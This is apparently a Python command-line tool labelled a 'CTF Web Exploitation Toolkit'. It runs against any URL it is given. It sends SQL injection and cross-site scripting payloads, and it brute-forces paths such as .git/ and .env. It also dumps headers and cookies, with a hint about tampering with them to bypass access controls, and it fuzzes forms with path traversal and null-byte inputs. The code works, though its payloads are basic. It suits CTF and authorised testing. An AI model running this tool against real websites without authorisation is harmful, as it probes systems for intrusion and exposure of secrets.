
import warnings
warnings.filterwarnings("ignore", category=UserWarning, module='urllib3')
import requests
import argparse
from colorama import init, Fore, Style
import sys

# Initialize colorama
init(autoreset=True)

# List of common payloads for testing
SQLI_PAYLOADS = ["'", "\"", "' OR 1=1--", "' OR '1'='1", "\"' OR 1=1#"]
XSS_PAYLOADS = ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
COMMON_DIRS = ["admin", "login", "config", "backup", "robots.txt", ".git/", ".env"]

def test_sqli(url, method="GET"):
    print(Fore.CYAN + f"[*] Testing SQL Injection on {url}")
    for payload in SQLI_PAYLOADS:
        target = f"{url}?id={payload}" if method == "GET" else url
        try:
            if method == "GET":
                res = requests.get(target, timeout=5)
            else:
                res = requests.post(target, data={"username": payload, "password": "password"}, timeout=5)
            
            # Simple error-based detection
            if any(error in res.text.lower() for error in ["sql syntax", "mysql", "sqlite", "postgresql"]):
                print(Fore.RED + f"[+] Possible SQLi found with payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(Fore.YELLOW + f"[-] Error with payload {payload}: {e}")

def test_xss(url):
    print(Fore.CYAN + f"[*] Testing XSS on {url}")
    for payload in XSS_PAYLOADS:
        target = f"{url}?search={payload}"
        try:
            res = requests.get(target, timeout=5)
            if payload in res.text:
                print(Fore.RED + f"[+] Possible XSS found with payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(Fore.YELLOW + f"[-] Error with payload {payload}: {e}")

def brute_force_dirs(url, wordlist=None):
    print(Fore.CYAN + f"[*] Brute-forcing directories on {url}")
    dirs = COMMON_DIRS
    if wordlist:
        try:
            with open(wordlist, 'r') as f:
                dirs = f.read().splitlines()
        except FileNotFoundError:
            print(Fore.RED + "[-] Wordlist not found, using default list.")
            
    for d in dirs:
        target = f"{url.rstrip('/')}/{d}"
        try:
            res = requests.get(target, timeout=5)
            if res.status_code in [200, 301, 302, 403]:
                print(Fore.GREEN + f"[+] Found: {target} (Status: {res.status_code})")
        except requests.exceptions.RequestException:
            pass

def analyze_headers(url):
    print(Fore.CYAN + f"[*] Analyzing Headers and Cookies for {url}")
    try:
        res = requests.get(url, timeout=5)
        print(Fore.YELLOW + "[*] Headers:")
        for k, v in res.headers.items():
            print(f"  {k}: {v}")
            
        print(Fore.YELLOW + "[*] Cookies:")
        for cookie in res.cookies:
            print(f"  {cookie.name} = {cookie.value}")
            
        # Tampering helper hint
        print(Style.DIM + "\nHint: Try modifying 'Cookie' or 'User-Agent' headers to bypass access controls.")
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[-] Error: {e}")

def fuzz_form(url):
    print(Fore.CYAN + f"[*] Fuzzing form parameters on {url}")
    # Basic fuzzer for testing input validation length and characters
    fuzz_payloads = ["A" * 1000, "../" * 10, "%00", "!@#$%^&*()"]
    for payload in fuzz_payloads:
        try:
            res = requests.post(url, data={"test_param": payload}, timeout=5)
            if res.status_code == 500:
                print(Fore.RED + f"[+] Server error (500) triggered with payload: {payload[:20]}...")
        except requests.exceptions.RequestException:
            pass

def main():
    parser = argparse.ArgumentParser(description="CTF Web Exploitation Toolkit")
    parser.add_argument("--url", required=True, help="Target URL (e.g., http://example.com)")
    parser.add_argument("--mode", choices=['all', 'sqli', 'xss', 'dirb', 'headers', 'fuzz'], default='all', help="Mode of operation")
    parser.add_argument("--wordlist", help="Path to wordlist for directory brute forcing")
    
    args = parser.parse_args()
    url = args.url
    
    print(Fore.MAGENTA + Style.BRIGHT + "=== CTF Web Exploitation Toolkit ===")
    
    if args.mode in ['all', 'sqli']:
        test_sqli(url)
    if args.mode in ['all', 'xss']:
        test_xss(url)
    if args.mode in ['all', 'dirb']:
        brute_force_dirs(url, args.wordlist)
    if args.mode in ['all', 'headers']:
        analyze_headers(url)
    if args.mode in ['all', 'fuzz']:
        fuzz_form(url)

if __name__ == "__main__":
    main()
